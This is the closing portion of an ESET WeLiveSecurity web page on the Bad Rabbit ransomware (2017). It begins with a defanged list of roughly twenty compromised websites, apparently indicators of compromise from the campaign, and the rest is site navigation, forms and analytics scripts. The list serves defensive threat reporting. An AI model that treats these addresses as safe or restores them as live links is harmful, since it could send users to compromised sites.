<li>hxxp://www.sinematurk[.]com</li>
<li>hxxp://www.aica.co[.]jp</li>
<li>hxxp://spbvoditel[.]ru</li>
<li>hxxp://argumenti[.]ru</li>
<li>hxxp://www.mediaport[.]ua</li>
<li>hxxp://blog.fontanka[.]ru</li>
<li>hxxp://an-crimea[.]ru</li>
<li>hxxp://www.t.ks[.]ua</li>
<li>hxxp://most-dnepr[.]info</li>
<li>hxxp://osvitaportal.com[.]ua</li>
<li>hxxp://www.otbrana[.]com</li>
<li>hxxp://calendar.fontanka[.]ru</li>
<li>hxxp://www.grupovo[.]bg</li>
<li>hxxp://www.pensionhotel[.]cz</li>
<li>hxxp://www.online812[.]ru</li>
<li>hxxp://www.imer[.]ro</li>
<li>hxxp://novayagazeta.spb[.]ru</li>
<li>hxxp://i24.com[.]ua</li>
<li>hxxp://bg.pensionhotel[.]com</li>
<li>hxxp://ankerch-crimea[.]ru</li>
</ul>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                    Marc-Etienne M.Léveillé                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2017-10-24 20:48:58">24 Oct 2017 - 08:48PM</time>
                                    </span>
                                </div>
                            
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text"><em>Sign up to receive an email update whenever a new article is published in our <a href="https://www.welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/" target="_blank" rel="noopener">Ukraine Crisis – Digital Security Resource Center</a></em></span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="TOPIC" value="We Live Security Ukraine Newsletter">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="button-flag">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text">Newsletter</span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="NEWSLETTER" value="We Live Security">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/ransomware-malware/" class="category-tag-btn">Ransomware</a>                                                <a href="https://www.welivesecurity.com/2022/05/16/downside-debugging-ransomware/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/05/ransomware-decryptors-public-release-623x415.jpg"
                                                         alt="Bad Rabbit: Not&#8209;Petya is back with improved ransomware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/05/16/downside-debugging-ransomware/">
                                                    The downside of ‘debugging’ ransomware                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/ransomware-malware/" class="category-tag-btn">Ransomware</a>                                                <a href="https://www.welivesecurity.com/2021/10/19/52-billion-bitcoin-transactions-possibly-tied-ransomware/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/10/ransomware-payments-money-laundering-fincen-report-623x415.jpg"
                                                         alt="Bad Rabbit: Not&#8209;Petya is back with improved ransomware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/10/19/52-billion-bitcoin-transactions-possibly-tied-ransomware/">
                                                    $5.2 billion worth of Bitcoin transactions possibly tied to ransomware                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/ransomware-malware/" class="category-tag-btn">Ransomware</a>                                                <a href="https://www.welivesecurity.com/2021/10/11/ransomware-cost-us-companies-almost-21billion-downtime-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/10/ransomware-us-companies-cost-downtime-623x427.jpg"
                                                         alt="Bad Rabbit: Not&#8209;Petya is back with improved ransomware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/10/11/ransomware-cost-us-companies-almost-21billion-downtime-2020/">
                                                    Ransomware cost US companies almost $21 billion in downtime in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/ransomware-malware/" class="category-tag-btn">Ransomware</a>                                                <a href="https://www.welivesecurity.com/2021/08/19/are-you-customer-one-paying-ransomware-demand/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/08/who-pays-ransomware-demands-623x415.jpg"
                                                         alt="Bad Rabbit: Not&#8209;Petya is back with improved ransomware">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/08/19/are-you-customer-one-paying-ransomware-demand/">
                                                    Are you, the customer, the one paying the ransomware demand?                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy Policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F24%2Fbad-rabbit-not-petya-back%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F24%2Fbad-rabbit-not-petya-back%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F24%2Fbad-rabbit-not-petya-back%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/js/main.js?id=fef3139dcedd23afc232"></script>
    <!-- Version: v1.10.0.0df103.pro.azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"102822 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=102822","disqusShortname":"welivesecurity","disqusTitle":"Bad Rabbit: Not\u2011Petya is back with improved ransomware","disqusUrl":"https:\/\/www.welivesecurity.com\/2017\/10\/24\/bad-rabbit-not-petya-back\/","postId":"102822"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>
